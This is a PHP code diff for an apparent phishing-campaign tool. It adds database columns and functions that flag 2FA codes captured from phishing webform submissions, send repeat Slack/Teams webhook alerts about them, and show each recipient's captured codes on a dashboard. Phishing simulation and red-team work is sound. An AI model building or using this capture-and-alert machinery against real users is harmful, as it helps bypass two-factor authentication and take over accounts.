@@ -209,3 +209,97 @@ if (!function_exists('taphish_set_capture_webhook_url')) {
         return (bool) $ok;
     }
 }
+
+if (!function_exists('taphish_ensure_capture_schema_v2')) {
+    /**
+     * Phase 3.45e: idempotently add the two capture-tracking columns
+     * needed for the repeat-webhook + 2FA-capture features.
+     */
+    function taphish_ensure_capture_schema_v2(\mysqli $conn): void
+    {
+        $columns = [
+            ['tb_data_webform_submit', 'is_2fa_capture',      'TINYINT(1) NOT NULL DEFAULT 0'],
+            ['tb_data_webform_submit', 'repeat_webhook_sent', 'TINYINT(1) NOT NULL DEFAULT 0'],
+        ];
+        foreach ($columns as [$table, $col, $type]) {
+            $stmt = $conn->prepare(
+                "SELECT COUNT(*) FROM information_schema.COLUMNS
+                 WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ? AND COLUMN_NAME = ?"
+            );
+            if ($stmt === false) {
+                continue;
+            }
+            $stmt->bind_param('ss', $table, $col);
+            $stmt->execute();
+            $row = $stmt->get_result()->fetch_row();
+            $stmt->close();
+            if ($row && (int) $row[0] > 0) {
+                continue;
+            }
+            @$conn->query("ALTER TABLE `{$table}` ADD COLUMN `{$col}` {$type}");
+        }
+    }
+}
+
+if (!function_exists('taphish_should_send_repeat_capture_webhook')) {
+    /**
+     * Phase 3.45e: repeat-capture webhook guard. A repeat fires only
+     * when (a) it isn't the first capture, (b) the row carries a 2FA
+     * code (the operationally interesting event), and (c) no repeat
+     * webhook has fired for this submit row yet.
+     */
+    function taphish_should_send_repeat_capture_webhook(array $existingRow): bool
+    {
+        if (empty($existingRow['code_2fa']) || !empty($existingRow['repeat_webhook_sent'])) {
+            return false;
+        }
+        return true;
+    }
+}
+
+if (!function_exists('taphish_repeat_capture_webhook_payload')) {
+    /**
+     * Phase 3.45e: payload for a repeat capture — same shape as the
+     * first-capture payload with an explicit `is_repeat: true` flag so
+     * the Slack/Teams handler can branch.
+     */
+    function taphish_repeat_capture_webhook_payload(array $event): array
+    {
+        $payload = taphish_capture_webhook_payload($event);
+        $payload['is_repeat'] = true;
+        $payload['text']     = str_replace(':bait_and_hook:', ':repeat:', $payload['text']);
+        $payload['content']  = $payload['text'];
+        return $payload;
+    }
+}
+
+if (!function_exists('taphish_capture_summary_for_campaign')) {
+    /**
+     * Phase 3.45e: per-RID capture summary the dashboard renders next
+     * to each recipient row. Aggregates count + concatenated 2FA codes.
+     */
+    function taphish_capture_summary_for_campaign(\mysqli $conn, string $campaign_id): array
+    {
+        $stmt = $conn->prepare(
+            "SELECT rid, COUNT(*) AS captures, GROUP_CONCAT(code_2fa SEPARATOR ', ') AS codes
+             FROM tb_data_webform_submit
+             WHERE tracker_id = ?
+             GROUP BY rid"
+        );
+        if ($stmt === false) {
+            return [];
+        }
+        $stmt->bind_param('s', $campaign_id);
+        $stmt->execute();
+        $res = $stmt->get_result();
+        $out = [];
+        while ($r = $res->fetch_assoc()) {
+            $out[$r['rid']] = [
+                'captures' => (int) $r['captures'],
+                'codes'    => $r['codes'],
+            ];
+        }
+        $stmt->close();
+        return $out;
+    }
+}
